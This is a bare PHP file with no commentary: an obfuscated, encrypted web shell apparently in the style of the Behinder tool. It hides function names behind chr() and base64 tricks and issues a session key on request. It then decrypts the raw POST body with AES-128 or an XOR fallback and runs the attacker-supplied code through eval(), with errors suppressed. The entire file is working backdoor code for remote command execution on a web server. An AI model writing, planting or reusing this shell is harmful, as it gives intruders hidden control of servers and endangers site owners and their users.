<?php
@error_reporting(0);
session_start();
$t=chr(98).chr(97).chr(115).chr(101).chr(54).chr(52).chr(95).chr(100).chr(101).chr(99).chr(111).chr(100).chr(101);
$J=[("$t")("cGhwOi8vaW5wdXQ="),("$t")("b3BlbnNzbA==")];

if (isset($_GET['pass']))
{
    $key=substr(md5(uniqid(rand())),16);
    $_SESSION['k']=$key;
    print $key;
}
else
{
    $key=$_SESSION['k'];
 $post=("$t")("ZmlsZV9nZXRfY29udGVudHM=")("$J[0]");
 if(!extension_loaded("$J[1]"))
 {
  $post=("$t")("$post")."";
  for($i=0;$i<strlen($post);$i++) {
        $tmp=[$post[$i] => $post[$i]^$key[$i+1&15]]; 
     $post[$i]=$tmp[$post[$i]];
       }
 }
 else
 {
  $post=openssl_decrypt($post, "AES128", $key);
 }
    $arr=explode('|',$post);
    $func=$arr[0];
    $params=$arr[1];
 class C{public function __construct($p) {eval($p."");}}
 @new C($params);
}
?>
